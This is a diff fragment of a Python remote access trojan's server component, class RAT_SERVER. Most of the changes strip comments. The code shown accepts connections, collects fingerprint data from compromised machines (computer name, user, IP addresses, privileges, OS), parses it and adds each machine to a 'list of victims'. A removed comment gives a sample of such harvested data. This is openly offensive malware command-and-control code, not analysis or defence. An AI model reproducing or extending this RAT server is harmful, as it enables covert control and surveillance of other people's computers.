@@ -38,16 +38,8 @@ class RAT_SERVER(metaclass=SingletonMeta):
             self.clients.append((client, addr))
             print(f"[*] Connection is established successfully with {addr[0]}")
 
-            # Once connection has been established, start a new thread to handle the client
-            # We expect information back from the client
             output = self.receive_output(client)
             print(f"[*] Output received: {output}")
-
-            # Example output:
-
-            # Output received: System: Windows-10-10.0.23555-SP0 Core|Version: 10.0.23555|Architecture: ('64bit', 'WindowsPE')|Name of Computer: Lukas|Processor: AMD64 Family 25 Model 33 Stepping 2, AuthenticAMD|Python: 3.10.9|User: lukma|IPv4: 192.168.87.22|IPv6: 192.168.87.22|Uptime: 8:09:16.999999|Privileges: 0|Bit: AMD64|Rat-Ted-Version: 1.0.0
-
-            # Turn it into a dict so we can access the information easily
 
             output = output.split("|")
             output_dict = {}
@@ -55,11 +47,9 @@ class RAT_SERVER(metaclass=SingletonMeta):
                 item = item.split(":")
                 output_dict[item[0]] = item[1]
 
-            # Add the client to the list of victims
             print(
                 f"[*] Adding {output_dict['Name of Computer']} to the list of victims")
-            
-            # check if the client is already in the list of victims
+
             for victim in self.victims:
                 if victim["Name of Computer"] == output_dict["Name of Computer"]:
                     self.victims.remove(victim)
@@ -67,11 +57,8 @@ class RAT_SERVER(metaclass=SingletonMeta):
 
     def receive_output(self, client_socket):
         try:
-            # Make a time limit for the output
-            # If the output is not received in 5 seconds, return an error
             print("Receiving output")
 
-            # wait for the output for 5 seconds
             ready = select.select([client_socket], [], [], 5)
 
             if ready[0]:
